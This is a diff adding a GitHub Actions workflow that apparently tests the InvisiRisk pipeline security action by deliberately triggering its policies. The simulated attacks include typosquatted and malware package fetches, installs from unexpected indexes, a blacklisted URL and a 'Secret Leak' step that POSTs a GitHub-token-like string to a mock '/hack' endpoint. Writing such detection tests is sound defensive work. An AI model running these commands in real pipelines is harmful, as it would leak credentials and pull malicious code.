@@ -1,0 +1,126 @@
+name: JS
+
+on:
+  workflow_dispatch:
+
+permissions:
+  checks: write
+  contents: write
+  packages: read
+  actions: write
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    name: Build Angular Project and Run PSE
+
+    steps:
+      # Checkout repository
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Setup PSE
+      - name: Setup PSE
+        uses: invisirisk/pse-action@dev-test
+        with:
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_L_STAGE }}
+
+      # Setup Node.js
+      - name: Use Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: "22.11.0"
+
+      - name: Install downgraded package
+        continue-on-error: true
+        run: pip install requests==2.31.0
+
+      - name: Install from unexpected source
+        continue-on-error: true
+        run: pip install numpy==1.9.3 --no-deps --index-url https://test.pypi.org/simple/
+
+      - name: Install typosquatted package
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/requestss-7.2.0-py2.py3-none-any.whl.metadata
+
+      - name: Install with different checksum
+        continue-on-error: true
+        run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
+
+      - name: Contact new endpoint
+        continue-on-error: true
+        run: curl http://example.com/test
+
+      - name: Run unusual command
+        continue-on-error: true
+        run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt
+
+      - name: Create unexpected file
+        continue-on-error: true
+        run: echo "Suspicious content" > suspicious2.txt
+
+      - name: Make cURL request
+        run: curl https://package-registry.free.beeceptor.com/packages
+
+      # - name: Simulate long-running task
+      #   continue-on-error: true
+      #   run: sleep 200
+
+      - name: Dummy PUT request (Unauthorized PUT Action)
+        run: |
+          curl -X PUT "https://httpbin.org/put"
+
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+            }'
+
+          curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+
+          curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+      - name: Mime Type Policy (Response Content Type)
+        run: curl -s -L "https://tinyurl.com/invisirisk"
+
+      - name: Content length download (Response Content Length)
+        run: curl -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
+
+      - name: Install MALWARE package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
+
+      - name: Install KEV package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
+
+      - name: in Blacklisted URL (in dataset) (Custom Builtins)
+        run: curl -k https://cdn.jsdelivr.net/gh/Fabriziovigna11/mn-authz-x7/s5-r9
+
+      # Install project dependencies
+      - name: Install dependencies
+        run: npm install --legacy-peer-deps
+
+      # Cleanup PSE
+      - name: Cleanup PSE
+        if: always()
+        uses: invisirisk/pse-action@dev-test
+        with:
+          cleanup: "true"
+
+  gather_analytics:
+    runs-on: ubuntu-latest
+    name: Gather Analytics
+    needs: build-and-deploy
+    if: always()
+    steps:
+      - name: Gather Status
+        uses: invisirisk/pse-action@dev-test
+        with:
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_L_STAGE }}
+          send_job_status: "true"
+          debug: "true"
